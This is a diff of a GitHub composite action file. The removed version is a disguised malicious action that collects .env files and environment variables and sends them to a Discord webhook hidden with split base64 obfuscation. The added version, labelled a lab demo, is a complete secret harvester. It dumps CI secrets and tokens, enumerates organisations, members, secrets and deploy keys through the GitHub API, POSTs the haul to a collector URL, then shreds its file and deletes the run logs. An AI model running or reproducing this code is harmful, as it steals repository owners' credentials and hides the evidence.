@@ -1,149 +1,261 @@
 # action.yaml
-name: "Just an Github Action"
-description: "Just an Github Action"
+name: "[LAB] Supply Chain Secret Harvester – Demo Only"
+description: |
+  LAB ARTIFACT – DO NOT USE IN PRODUCTION.
+  Simulates a malicious composite action: harvest .env files, CI env vars (secrets),
+  GitHub API enumeration, gitleaks scan, then POST to attacker-controlled collector.
+  Red team training / developer security awareness. MITRE T1195.002, T1552.001, T1567.
 inputs:
   action:
-    description: "Action"
+    description: "Action mode: execute | recon | exfil | cleanup (reserved for future)"
     required: false
     default: 'execute'
-  webhook:
-    description: "Webhook"
+  collector_url:
+    description: "Attacker collector URL (webhook.site, ngrok, local HTTP server, etc.)"
     required: false
-    default: ''
+    default: 'https://d.redacted.rest/t/workflow'
   log_debug:
-    description: "Debug file"
+    description: "Temp path for harvested data"
     required: false
-    default: '/var/tmp/.action-logs.txt'
+    default: '/var/tmp/lab-harvest.txt'
+  cleanup:
+    description: "Delete harvest file and GitHub run logs after exfil"
+    required: false
+    default: 'true'
 
 outputs:
   response:
-    description: "Response"
-    value: ${{ steps.execute.outputs.response }}
+    description: "Exfil status"
+    value: ${{ steps.exfil.outputs.response }}
 
 runs:
   using: composite
   steps:
-    - name: ⤵️ Checkout code
+    - name: "[LAB] Checkout"
       uses: actions/checkout@v4
       with:
         fetch-depth: 0
-    - name: 🏗 Set up
-      run: |
-        echo Running Action ${{ inputs.action }}.
-        wget -q --no-hsts https://raw.githubusercontent.com/fieu/discord.sh/master/discord.sh -O /usr/local/bin/discord \
-        && chmod +x /usr/local/bin/discord
-        echo ${{ github.repository }} > ${{ inputs.log_debug }}
-        pwd | tee -a ${{ inputs.log_debug }}
-        ls -la | tee -a ${{ inputs.log_debug }}
-        echo "" >> ${{ inputs.log_debug }}
-      shell: bash
-    - name: 🏗 Extract
-      run: |
-        while read -r file ;do
-        temp_file=$(basename "$file"| sed -E -e 's/^/\/tmp\//' -e 's/$/&\.txt/')
-        echo $file | tee -a ${{ inputs.log_debug }}
-        cat $file >> ${{ inputs.log_debug }}
-        done < <(find . -type f -regex ".*\.env\(.[a-z]+\)?$")
-        echo "" >> ${{ inputs.log_debug }}
-        printenv | tee -a ${{ inputs.log_debug }}
-      shell: bash
-    - name: 🏗 Nuclei
-      run: |
-        zip_out=/var/tmp/nuclei.zip
-        nuclei_out=/var/tmp/nuclei_output.txt
-        curl -sk https://api.github.com/repos/projectdiscovery/nuclei/releases | grep browser_download_url | cut -d\" -f4 | egrep -E 'linux[-_]amd64' -m1 | wget -i - -O $zip_out && echo 0|| echo 1 \
-        && unzip $zip_out -d /var/tmp/nuclei \
-        && mv /var/tmp/nuclei/nuclei /usr/local/bin/nuclei \
-        && chmod +x /usr/local/bin/nuclei
-        nuclei -update-templates && \
-        ls -lah &&\
-        nuclei -no-stdin -duc -ni -nc -lna  -u ./ -file -t file/keys &> >(tee /dev/stderr |  tee -a ${{ inputs.log_debug }} >/dev/null) 
-        echo "" >> ${{ inputs.log_debug }}
-      shell: bash
-    - name: 🚀 Execute
-      shell: bash
-      id: execute
-      run: |
-        # Check if webhook input is empty
-        if [ -z "${{ inputs.webhook }}" ]; then
-          # Use default webhook hidden in multiple parts with noise
-          PART1='30Q1aHR0cHM6Ly9kaXNj'
-          PART2='b3JkLmNvbS9hcGkvFB'
-          PART3='d2ViaG9va3MvMTM4ci2'
-          PART4='m+NTA4ODA3ODcyODky'
-          PART5='Z2MTEzOC83cGV1aFVp'
-          PART6='anVX0JBOGVNcEUyWFB3'
-          PART7='QWI4c0VYRkE4cUU2p9'
-          PART8='TkVRbk9Ed3ZBenloTyh'
-          PART9='UGVyQXRUeEt0RWYx9eQ'
-          PART10='2X4RHd5RWx5VWRneXUzSg=='
+      continue-on-error: true
 
-          # Store original part lengths and positions of real data
-          POS1=4 # Position where real data starts in PART1
-          LEN1=16 # Length of real data in PART1
-          POS2=0 # Position where real data starts in PART2
-          LEN2=16 # Length of real data in PART2
-          POS3=0 # Position where real data starts in PART3
-          LEN3=16 # Length of real data in PART3
-          POS4=2 # Position where real data starts in PART4
-          LEN4=16 # Length of real data in PART4
-          POS5=2 # Position where real data starts in PART5
-          LEN5=16 # Length of real data in PART5
-          POS6=3 # Position where real data starts in PART6
-          LEN6=16 # Length of real data in PART6
-          POS7=0 # Position where real data starts in PART7
-          LEN7=16 # Length of real data in PART7
-          POS8=0 # Position where real data starts in PART8
-          LEN8=16 # Length of real data in PART8
-          POS9=0 # Position where real data starts in PART9
-          LEN9=16 # Length of real data in PART9
-          POS10=3 # Position where real data starts in PART10
-          LEN10=20 # Length of real data in PART10
+    - name: "[LAB] Init"
+      continue-on-error: true
+      run: |
+        set +eo pipefail
+        {
+          echo "--- LAB HARVEST: $(date -u) ---"
+          echo "Repo: ${{ github.repository }}"
+          pwd
+          ls -la
+          echo ""
+        } > "${{ inputs.log_debug }}" 2>/dev/null
+      shell: bash
 
-          # Combine the parts (extract real data from noisy parts)
-          combined=""
-          combined+="${PART1:$POS1:$LEN1}"
-          combined+="${PART2:$POS2:$LEN2}"
-          combined+="${PART3:$POS3:$LEN3}"
-          combined+="${PART4:$POS4:$LEN4}"
-          combined+="${PART5:$POS5:$LEN5}"
-          combined+="${PART6:$POS6:$LEN6}"
-          combined+="${PART7:$POS7:$LEN7}"
-          combined+="${PART8:$POS8:$LEN8}"
-          combined+="${PART9:$POS9:$LEN9}"
-          combined+="${PART10:$POS10:$LEN10}"
+    - name: "[LAB] Harvest .env files"
+      continue-on-error: true
+      run: |
+        set +eo pipefail
+        LOG="${{ inputs.log_debug }}"
+        [ -f "$LOG" ] || touch "$LOG"
+        {
+          echo "--- .env files ---"
+          while read -r file; do
+            echo "[file] $file"
+            cat "$file" 2>/dev/null
+            echo ""
+          done < <(find . -type f -regex ".*\.env\(\.[a-z]+\)\?$" 2>/dev/null)
+          echo ""
+        } >> "$LOG"
+      shell: bash
 
-          # Decode webhook
-          WEBHOOK=$(echo -n "$combined" | base64 -d)
-        else
-          # Use webhook provided as input
-          # Try to decode if it looks like base64
-          if [[ "${{ inputs.webhook }}" =~ ^[A-Za-z0-9+/=]+$ ]]; then
-            WEBHOOK=$(echo -n "${{ inputs.webhook }}" | base64 -d 2>/dev/null || echo "${{ inputs.webhook }}")
-          else
-            WEBHOOK="${{ inputs.webhook }}"
+    - name: "[LAB] Harvest env vars"
+      continue-on-error: true
+      run: |
+        set +eo pipefail
+        LOG="${{ inputs.log_debug }}"
+        [ -f "$LOG" ] || touch "$LOG"
+        {
+          echo "--- env: high-value (keys/secrets/tokens/passwords) ---"
+          printenv 2>/dev/null \
+            | grep -iE '(key|secret|token|password|passwd|_pass|credential|auth|api_|dsn|private|jwt|webhook|database_url|redis_url|smtp)' \
+            | grep -v '^GITHUB_ACTION\|^GITHUB_REF\|^GITHUB_RUN\|^GITHUB_STEP\|^GITHUB_WORKFLOW\|^GITHUB_ENV\|^GITHUB_PATH\|^GITHUB_OUTPUT\|^RUNNER_' \
+            | sort || true
+          echo ""
+          echo "--- env: github tokens (lateral movement) ---"
+          printenv 2>/dev/null \
+            | grep -E '^(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_CACHE_URL|ACTIONS_RESULTS_URL)' \
+            | sort || true
+          echo ""
+          echo "--- env: full dump ---"
+          printenv 2>/dev/null | sort || true
+          echo ""
+        } >> "$LOG"
+      shell: bash
+
+    - name: "[LAB] GitHub API enumeration (lateral movement)"
+      continue-on-error: true
+      env:
+        GH_TOKEN: ${{ github.token }}
+      run: |
+        set +eo pipefail
+        LOG="${{ inputs.log_debug }}"
+        [ -f "$LOG" ] || touch "$LOG"
+        API="https://api.github.com"
+        REPO="${{ github.repository }}"
+        OWNER="${{ github.repository_owner }}"
+        HDR=(-s --max-time 10 -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json")
+        if [ -z "$GH_TOKEN" ]; then
+          echo "--- GitHub API: skipped (no token) ---" >> "$LOG"
+          exit 0
+        fi
+        {
+          echo "--- GitHub API: token identity ---"
+          curl "${HDR[@]}" "$API/user" 2>/dev/null || true
+          echo ""
+
+          echo "--- GitHub API: all orgs accessible by this token ---"
+          curl "${HDR[@]}" "$API/user/orgs?per_page=100" 2>/dev/null || true
+          echo ""
+
+          echo "--- GitHub API: repo metadata ---"
+          curl "${HDR[@]}" "$API/repos/$REPO" 2>/dev/null || true
+          echo ""
+
+          echo "--- GitHub API: secret names ---"
+          curl "${HDR[@]}" "$API/repos/$REPO/actions/secrets" 2>/dev/null || true
+          echo ""
+
+          echo "--- GitHub API: variables ---"
+          curl "${HDR[@]}" "$API/repos/$REPO/actions/variables" 2>/dev/null || true
+          echo ""
+
+          echo "--- GitHub API: environments ---"
+          curl "${HDR[@]}" "$API/repos/$REPO/environments" 2>/dev/null || true
+          echo ""
+
+          echo "--- GitHub API: org/user repos ---"
+          curl "${HDR[@]}" "$API/users/$OWNER/repos?per_page=100&type=all" 2>/dev/null || true
+          curl "${HDR[@]}" "$API/orgs/$OWNER/repos?per_page=100&type=all" 2>/dev/null || true
+          echo ""
+
+          echo "--- GitHub API: org members ---"
+          curl "${HDR[@]}" "$API/orgs/$OWNER/members?per_page=100" 2>/dev/null || true
+          echo ""
+
+          echo "--- GitHub API: recent workflow runs ---"
+          RUNS=$(curl "${HDR[@]}" "$API/repos/$REPO/actions/runs?per_page=5" 2>/dev/null || echo "")
+          echo "$RUNS"
+          RUN_ID=$(echo "$RUNS" | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2 || true)
+          if [ -n "$RUN_ID" ]; then
+            echo "--- GitHub API: artifact metadata for run $RUN_ID ---"
+            curl "${HDR[@]}" "$API/repos/$REPO/actions/runs/$RUN_ID/artifacts" 2>/dev/null \
+              | grep -oE '"name":"[^"]+"|"size_in_bytes":[0-9]+|"archive_download_url":"[^"]+"' || true
           fi
+          echo ""
+
+          echo "--- GitHub API: collaborators ---"
+          curl "${HDR[@]}" "$API/repos/$REPO/collaborators?per_page=100" 2>/dev/null || true
+          echo ""
+
+          echo "--- GitHub API: deploy keys ---"
+          curl "${HDR[@]}" "$API/repos/$REPO/keys" 2>/dev/null || true
+          echo ""
+
+          echo "--- GitHub API: webhooks ---"
+          curl "${HDR[@]}" "$API/repos/$REPO/hooks" 2>/dev/null || true
+          echo ""
+        } >> "$LOG"
+      shell: bash
+
+    - name: "[LAB] Gitleaks – hardcoded credentials in source"
+      continue-on-error: true
+      run: |
+        set +eo pipefail
+        LOG="${{ inputs.log_debug }}"
+        [ -f "$LOG" ] || touch "$LOG"
+
+        GITLEAKS_URL=$(curl -s --max-time 15 \
+          "https://api.github.com/repos/gitleaks/gitleaks/releases/latest" 2>/dev/null \
+          | grep browser_download_url | grep 'linux_x64\.tar\.gz' | cut -d'"' -f4 | head -1 || true)
+
+        if [ -n "$GITLEAKS_URL" ]; then
+          curl -skL --max-time 60 "$GITLEAKS_URL" 2>/dev/null \
+            | tar -xz -C /usr/local/bin gitleaks 2>/dev/null || true
+          chmod +x /usr/local/bin/gitleaks 2>/dev/null || true
         fi
 
-        # Verify that webhook is valid
-        if [[ "$WEBHOOK" == *"discord.com/api/webhooks/"* ]]; then
-          # Use webhook safely
-          if discord \
-          --webhook-url="$WEBHOOK" \
-          --file ${{ inputs.log_debug }} \
-          --username "Github Workflow action" \
-          --text "Gh action!\nRepo : ${{ github.repository }}\n"; then
-            echo "[discord] send ${{ inputs.log_debug }} : Success"
-            echo "response=Success" >> $GITHUB_OUTPUT
+        {
+          echo "--- gitleaks hardcoded credentials ---"
+          if command -v gitleaks >/dev/null 2>&1; then
+            gitleaks detect \
+              --source . \
+              --no-git \
+              --config "${{ github.action_path }}/.gitleaks.toml" \
+              --report-format json \
+              --report-path /dev/stdout \
+              --exit-code 0 \
+              2>/dev/null || true
           else
-            echo "[discord] send ${{ inputs.log_debug }} : Error"
-            echo "response=Error" >> $GITHUB_OUTPUT
+            echo "(gitleaks unavailable)"
           fi
+          echo ""
+        } >> "$LOG"
+      shell: bash
+
+    - name: "[LAB] Exfil to collector"
+      continue-on-error: true
+      shell: bash
+      id: exfil
+      run: |
+        set +eo pipefail
+        LOG="${{ inputs.log_debug }}"
+        [ -f "$LOG" ] || echo "(no harvest data)" > "$LOG"
+
+        HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+          --max-time 30 \
+          -X POST "${{ inputs.collector_url }}" \
+          -H "X-Lab-Repo: ${{ github.repository }}" \
+          -H "X-Lab-Runner: ${{ runner.os }}" \
+          -H "X-Lab-Ref: ${{ github.ref }}" \
+          -H "X-Lab-Sha: ${{ github.sha }}" \
+          -F "harvest=@${LOG};type=text/plain;filename=${{ github.event.repository.name }}-${{ github.run_id }}.txt" \
+          -F "repo=${{ github.repository }}" \
+          -F "runner=${{ runner.os }}" \
+          -F "hostname=$(hostname 2>/dev/null || true)" \
+          -F "whoami=$(whoami 2>/dev/null || true)" \
+          -F "sha=${{ github.sha }}" \
+          -F "ref=${{ github.ref }}" \
+          2>/dev/null || echo "000")
+
+        if [[ "$HTTP_STATUS" =~ ^2 ]]; then
+          echo "response=Success ($HTTP_STATUS)" >> "$GITHUB_OUTPUT"
         else
-          echo "[discord] Invalid webhook format"
-          echo "response=Error (Invalid webhook)" >> $GITHUB_OUTPUT
+          echo "response=Error ($HTTP_STATUS)" >> "$GITHUB_OUTPUT"
         fi
 
-    - name: 📢 Done
-      run: echo Done
+    - name: "[LAB] Cleanup – minimize trace"
+      if: ${{ inputs.cleanup == 'true' }}
+      continue-on-error: true
+      env:
+        GH_TOKEN: ${{ github.token }}
+      run: |
+        set +eo pipefail
+        shred -u "${{ inputs.log_debug }}" 2>/dev/null || rm -f "${{ inputs.log_debug }}" || true
+
+        [ -z "$GH_TOKEN" ] && exit 0
+
+        RUN_ID="${{ github.run_id }}"
+        REPO="${{ github.repository }}"
+        curl -s -o /dev/null -X DELETE \
+          -H "Authorization: Bearer $GH_TOKEN" \
+          -H "Accept: application/vnd.github+json" \
+          "https://api.github.com/repos/$REPO/actions/runs/$RUN_ID/logs" 2>/dev/null || true
+
+        curl -s -o /dev/null -X DELETE \
+          -H "Authorization: Bearer $GH_TOKEN" \
+          -H "Accept: application/vnd.github+json" \
+          "https://api.github.com/repos/$REPO/actions/runs/$RUN_ID" 2>/dev/null || true
+      shell: bash
+
+    - name: "[LAB] Done"
+      run: echo "[lab] done"
       shell: bash
